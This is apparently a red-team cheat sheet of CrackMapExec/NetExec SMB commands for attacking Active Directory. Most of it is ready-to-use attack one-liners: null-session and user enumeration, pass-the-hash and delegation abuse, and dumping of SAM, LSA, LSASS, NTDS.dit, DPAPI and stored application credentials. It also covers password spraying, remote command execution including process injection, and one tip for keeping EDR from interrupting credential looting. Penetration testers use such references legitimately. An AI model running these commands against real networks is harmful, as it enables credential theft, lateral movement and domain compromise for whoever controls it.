# cme (SMB)

% cme, crackmapexec, Active Directory, nxc, netexec, smb


## Enumerate SMB reachable hosts
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Anonymous

Enumerate network hosts that can be reached via SMB.

```bash
cme smb <ip>
```

## Enumerate domain users anonymously
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Anonymous

Enumerate domain users through a null session.

```bash
cme smb <dc-ip> -u '' -p '' --users
```

## Enumerate domain users
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 

Enumerate domain users.

```bash
cme smb <dc-ip> -u <user> -p <password> --users
```

## Enumerate domain computers
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user

Enumerate domain computers.

```bash
cme smb <dc-ip> -u <user> -p <password> --computers
```

## Enumerate password policy
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user

Enumerate the domain password policy.

```bash
cme smb <dc-ip> -u <user> -p <password> --pass-pol
```

## Enumerate null session
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Anonymous

Check if the target accepts authentication via a null session.

```bash
cme smb <ip> -u '' -p ''
```

## Enumerate guest logon
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Anonymous

Check if the remote target accepts authentication via a Guest session.

```bash
cme smb <ip> -u 'a' -p ''
```

## Enumerate active SMB sessions
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 

Enumerate active SMB sessions (including RPC/DCOM over named pipes) on the remote target.

⚠️ Requirement : Most often requires admin privileges (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> --smb-sessions
```

## Enumerate users by bruteforce the RID
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 

```bash
cme smb <ip> -u <user> -p <password> --rid-brute
```

## Enumerate local groups
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 

```bash
cme smb <ip> -u <user> -p <password> --local-groups
```

## Enumerate shares
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 

Enumerate permissions on all shares. Filter by readable or writable.

```bash
cme smb <ip> -u <user> -p <password> -d <domain> --shares --filter-shares READ WRITE
```

## Enumerate disks
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 

Enumerate disks on the remote target

```bash
cme smb <ip> -u <user> -p <password> --disks
```

## Enumerate SMB target not signed
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user

Maps the network of live hosts and saves a list of only the hosts that  don't require SMB signing. List format is one IP per line.

```bash
cme smb <ip> --gen-relay-list smb_not_signed.list
```

## Enumerate logged-on users
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 

```bash
cme smb <ip> -u <user> -p <password> --loggedon-users
```

## Enumerate AV & EDR
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 

```bash
cme smb <ip> -u <user> -p <password> -M enum_av
```

## Enumerate BitLocker
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Admin 

Enumerate BitLocker status on the remote target.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M bitlocker
```

## Enumerate WebDav
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 

Enumerate if the WebDav service is running on the remote target.

```bash
cme smb <ip> -u <user> -p <password> -M webdav
```

## Enumerate Spooler
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 

Enumerate if the Spooler service is running on the remote target.

```bash
cme smb <ip> -u <user> -p <password> -M spooler
```

## Enumerate network interfaces
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Admin

Enumerate network interfaces on a host.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> --interfaces
```

## Local-auth
#assessment/AD #attack_type/Authentication #port/445 #port/139 #protocol/smb #access/Domain_user

Authenticate via a local account on the target.

```bash
cme smb <ip> -u <user> -p <password> --local-auth
```

## Local-auth with hash
#assessment/AD #attack_type/Authentication #port/445 #port/139 #protocol/smb #access/Domain_user

```bash
cme smb <ip> -u <user> -H <hash> --local-auth
```

## Domain auth
#assessment/AD #attack_type/Authentication #port/445 #port/139 #protocol/smb #access/Domain_user

```bash
cme smb <ip> -u <user> -p <password> -d <domain>
```

## Kerberos auth
#assessment/AD #attack_type/Authentication #port/445 #port/139 #protocol/smb #access/Domain_user

Previously import ticket : 
export KRB5CCNAME=/tmp/ticket.ccache

```bash
cme smb <ip> --kerberos
```

## Delegated auth (RBCD)
#assessment/AD #attack_type/Authentication #port/445 #port/139 #protocol/smb #access/Domain_user

Execute RBCD and impersonate a user through msDS-AllowedToActOnBehalfOfOtherIdentity.

⚠️ Requirement : msDS-AllowedToActOnBehalfOfOtherIdentity attribute set to a controlled domain account

```bash
cme smb <ip> -u <user> -p <password> --delegate <impersonated_user>
```

## Delegated auth (S4U2Self)
#assessment/AD #attack_type/Authentication #port/445 #port/139 #protocol/smb #access/Domain_user

Execute S4U2Self and impersonate a user through msDS-AllowedToActOnBehalfOfOtherIdentity.

⚠️ Requirement : msDS-AllowedToActOnBehalfOfOtherIdentity attribute set to a controlled domain account

```bash
cme smb <ip> -u <computer$> -H <hash> --delegate <impersonated_user>
```


## Dump SAM
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump SAM hashes using methods from secretsdump.py

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> --sam
```

## Dump LSA
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump LSA secrets.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> --lsa
```

## Dump LSA (old method)
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump LSA secrets using methods from secretsdump.py

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> --lsa secdump
```

## Dump LSASS
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump secrets from the LSASS process memory using methods from LSASSY.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M lsassy
```

## Dump LSASS - with bloodhound update
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -H <hash> --local-auth -M lsassy -o BLOODHOUND=True NEO4JUSER=<user|neo4j> NEO4JPASS=<neo4jpass|exegol4thewin>
```

## Dump Security questions
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump local users security questions.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M security-questions
```

## Dump NTDS
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Domain_Admin

Dump the NTDS.dit from target DC using methods from secretsdump.py

⚠️ Requirement : Domain Admin ou Local admin privileges on the Domain Controller

```bash
cme smb <dc-ip> -u <user> -p <password> --ntds
```

## Dump DPAPI
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump the DPAPI credentials from target host. Retrieves all secrets from Credential Manager, Chrome, Edge, Firefox.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <dc-ip> -u <user> -p <password> --dpapi
```

## Dump DPAPI NoSystem (avoid EDR trigger)
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump the DPAPI credentials from target host. Retrieves all secrets from Credential Manager, Chrome, Edge, Firefox.
Won't collect system credentials. This will prevent EDR from stopping you from looting passwords.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <dc-ip> -u <user> -p <password> --dpapi nosystem
```

## Dump CLPA logs
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump clear-text credentials passed in command lines which are logged in Windows Event ID 4688 from the target host.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <dc-ip> -u <user> -p <password> -M eventlog_creds
```

## Dump WIFI password
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump the WIFI password register in Windows.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M wifi
```

## Dump WinSCP
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump WinSCP secrets.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M winscp
```

## Dump PuTTY
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump users private keys stored by PuTTY for remote connections (e.g. SSH).

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M putty
```

## Dump VNC
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump users credentials stored by RealVNC or TightVNC for remote connections.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M vnc
```

## Dump RDCMan (Remote Desktop Connection Manager)
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump Remote Desktop Connection Manager credentials.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M rdcman
```

## Dump mRemoteNG
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump mRemoteNG credentials.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M mremoteng
```

## Dump Notepad
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump unsaved Notepad documents and parse for potential credentials.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M notepad
```

## Dump Notepad++
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump unsaved Notepad++ documents and parse for potential credentials.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M notepad++
```

## Dump WAM (Token Broker Cache)
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump and decrypt access token from the Token Broker Cache.

Microsoft 365 and Azure applications on desktop will store access tokens to the Token Broker Cache. These are stored with user DPAPI.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M wam
```

## Dump SCCM
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Domain_Admin

Dump the SCCM from the target host using methods from dploot

⚠️ Requirement : Domain admin or Local admin privileges on target Domain Controller

```bash
cme smb <dc-ip> -u <user> -p <password> --sccm
```

## Dump VEEAM
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump the VEEAM credentials from the VEEAM server SQL database.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M veeam
```

## Dump with BackupOperator priv
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Domain_user

Dump SAM, SYSTEM, SECURITY (and the NTDS.dit on DC) on the target system.

⚠️ Requirement : Controlled user has SeBackupPrivilege. No admin privs needed.

```bash
cme smb <ip> -u <user> -p <password> -M backup_operator
```

## Enable wdigest
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Domain_user

Enable/disable the WDigest provider and dump clear-text credentials from LSA memory.

```bash
cme smb <ip> -u <user|Administrator> -p <password> --local-auth --wdigest enable
```

## Loggout user
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #warning/modify_target #access/Domain_user

Can be useful after enable wdigest to force user to reconnect.

```bash
cme smb <ip> -u <user> -p <password> -x 'quser'
cme smb <ip> -u <user> -p <password> -x 'logoff <id_user>' --no-output
```


## Password spray (user=password)
#assessment/AD #attack_type/Bruteforce #port/445 #port/139 #protocol/smb #access/Anonymous

```bash
cme smb <dc-ip> -u <users.list> -p <users.list> --no-bruteforce --continue-on-success
```

## Password spray multiple test 
#assessment/AD #attack_type/Bruteforce #port/445 #protocol/smb #access/Anonymous

(careful on lockout)

```bash
cme smb <dc-ip> -u <users.list> -p <password.txt> --continue-on-success
```


## Change a domain user password
#assessment/AD #attack_type/Authentication #port/445 #protocol/smb #access/Domain_user

Allows to change a domain user's password. Valuable if the actual password has expired and must be changed (authentication status : STATUS_PASSWORD_MUST_CHANGE).
(Notify the client about changing a user's password)

⚠️ Requirement : Knowledge of the targeted account's actual password.

```bash
cme smb <ip> -u <user> -p <password> -M change-password -o NEWPASS=<newpass>
```

## Execute remote commands (CMD)
#assessment/AD #attack_type/Command_Execution #port/445 #protocol/smb #access/Domain_user

Execute remote commands through Windows CMD.

⚠️ Requirement : Use --local-auth if the user is a local account

```bash
cme smb <ip> -u <user> -p <password> -x <command>
```

## Execute remote commands (PowerShell)
#assessment/AD #attack_type/Command_Execution #port/445 #protocol/smb #access/Domain_user

Execute remote commands through Windows PowerShell.

⚠️ Requirement : Use --local-auth if the user is a local account

```bash
cme smb <ip> -u <user> -p <password> -X <command>
```

## Execute remote commands with a specific method
#assessment/AD #attack_type/Command_Execution #port/445 #protocol/smb #access/Domain_user

Execute remote commands through Windows CMD using a specific execution method (wmiexec, atexec, smbexec).

⚠️ Requirement : Use --local-auth if the user is a local account

```bash
cme smb <ip> -u <user> -p <password> -x <command> --exec-method <method>
```

## Execute remote commands through Scheduled Tasks
#assessment/AD #attack_type/Command_Execution #port/445 #protocol/smb #access/Admin

Execute remote commands on behalf of another user with an active session on the targeted system, through Scheduled Tasks.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M schtask_as -o USER=<logged-on-user> CMD=<command>
```

## Execute remote commands through Process Injection
#assessment/AD #attack_type/Command_Execution #port/445 #protocol/smb #access/Admin

Execute remote commands on behalf of another user with an active session on the targeted system, through Process Injection.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M pi -o PID=<target_process_pid> EXEC=<command>
```

## List files in shares
#assessment/AD #attack_type/Other #port/445 #protocol/smb #access/Domain_user

Spider shares files on a remote system. Search can be filter by file extension.

```bash
cme smb <ip> -u <user> -p <password> --spider <share> --pattern <file_extension>
```

## Put file
#assessment/AD #attack_type/Other #port/445 #protocol/smb #access/Domain_user

Send a local file to the remote target.

```bash
cme smb <ip> -u <user> -p <password> --put-file <local_file> <remote_path|\\Windows\\Temp\\target.txt>
```

## Get file
#assessment/AD #attack_type/Other #port/445 #protocol/smb #access/Domain_user
Send a local file to the remote target

```bash
cme smb <ip> -u <user> -p <password> --get-file <remote_path|\\Windows\\Temp\\target.txt> <local_file>
```

= ip: 192.168.1.0/24
= dc-ip: $DC_IP
= user: $USER
= password: $PASSWORD
= domain: $DOMAIN
= method: wmiexec
= share: C\$
